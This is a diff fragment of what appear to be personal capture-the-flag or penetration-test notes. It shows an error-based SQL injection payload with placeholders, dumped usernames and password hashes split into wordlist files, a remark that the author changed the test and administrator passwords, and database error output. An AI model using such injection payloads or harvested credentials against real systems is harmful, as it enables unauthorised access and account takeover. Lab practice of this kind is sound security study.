@@ -37,3 +37,33 @@ encoded
 '; SELECT 1 / CAST((SELECT <column> FROM <table> LIMIT 1 OFFSET <n>) AS INTEGER); --
 
 e84edOziE/Knw2SKbNoyY5PGseegEfUGTyPxSpzuD3k=
+
+```bash
+Milton:qX+gUfRZNLo+5vfTQXNWyzKrhae7K+QQUavIQ0t1gP4=
+Jenn7:urmIl0dth2/JSxYn6254n24CwyvGMrD5EN2MyGvDmDs=
+the_homer:a6xCFJaV+ofUL3IVi0mMRmOhc1nSz1GlykjGWxUM7Xk=
+test:M17Ge5KyvWUW9NZwJcRxEm7UPfUZuofqQHnGyDofydg= 
+administrator:M17Ge5KyvWUW9NZwJcRxEm7UPfUZuofqQHnGyDofydg= 
+
+i changed the test and administrator passwords
+
+```
+usernames.txt
+```bash
+Milton
+Jenn7
+the_homer
+test
+administrator
+```
+passwords.txt
+```bash
+qX+gUfRZNLo+5vfTQXNWyzKrhae7K+QQUavIQ0t1gP4=
+urmIl0dth2/JSxYn6254n24CwyvGMrD5EN2MyGvDmDs=
+a6xCFJaV+ofUL3IVi0mMRmOhc1nSz1GlykjGWxUM7Xk=
+M17Ge5KyvWUW9NZwJcRxEm7UPfUZuofqQHnGyDofydg= 
+M17Ge5KyvWUW9NZwJcRxEm7UPfUZuofqQHnGyDofydg= 
+```
+errors
+cannot cast type uuid to integer error
+A result was returned when none was expected."
